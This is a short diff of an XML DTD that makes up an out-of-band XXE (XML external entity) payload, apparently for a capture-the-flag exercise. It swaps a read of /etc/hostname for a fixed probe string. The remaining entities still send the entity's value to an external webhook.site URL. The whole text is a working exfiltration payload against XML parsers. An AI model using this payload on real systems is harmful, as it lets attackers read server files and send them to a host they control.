@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % file "CTF_PROBE_123">
 <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'https://webhook.site/e850e7bf-a92e-488a-9378-0304f6f92200?data=%file;'>">
 %eval;
 %send;
